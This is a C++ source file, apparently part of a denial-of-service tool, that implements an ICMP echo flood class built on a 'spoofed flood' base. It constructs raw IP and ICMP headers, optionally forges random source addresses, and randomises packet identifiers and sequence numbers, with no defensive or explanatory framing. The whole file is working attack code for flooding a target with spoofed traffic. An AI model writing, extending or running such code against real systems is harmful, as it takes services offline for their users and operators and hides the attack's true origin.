#include "icmp_flood.h"
#include "stdafx.h"
#include "utils.h"

icmp_flood::icmp_flood() : base_spoofed_flood(IPPROTO_ICMP) {}

char *icmp_flood::gen_hdr(sockaddr_in *dst, int len) {
  char *string = new char[len];
  auto *ip = (iphdr *)string;
  auto *icmp = (icmphdr *)(string + sizeof(iphdr));
  std::string ipaddr{};
  bzero(string, (size_t)len);

  init_hdr(icmp, ip);

  ip->daddr = dst->sin_addr.s_addr;

  if (Config::get().rand_lhost) {
    utils::randomizer::randomIP(ipaddr);
    ip->saddr = inet_addr(ipaddr.c_str());
  } else {
    ip->saddr = 0;
  }

  ip->tot_len = htons(static_cast<uint16_t>(len));

  finalize_hdr(icmp, ip);

  return string;
}

void icmp_flood::init_hdr(icmphdr *icmp, iphdr *ip) {
  ip->version = 4;
  ip->ihl = sizeof(iphdr) / 4;
  ip->tos = 0;
  ip->id = htons(static_cast<uint16_t>(utils::randomizer::randomInt(1, 1000)));
  ip->frag_off = htons(0x0);
  ip->ttl = 255;
  ip->protocol = IPPROTO_ICMP;

  icmp->type = ICMP_ECHO;
  icmp->code = 0;
  icmp->un.echo.sequence =
      htons(static_cast<uint16_t>(utils::randomizer::randomInt(1, 1000)));
  icmp->un.echo.id =
      htons(static_cast<uint16_t>(utils::randomizer::randomInt(1, 1000)));
}

void icmp_flood::finalize_hdr(icmphdr *icmp, iphdr *) {
  icmp->checksum = utils::csum((unsigned short *)icmp, sizeof(icmphdr));
}
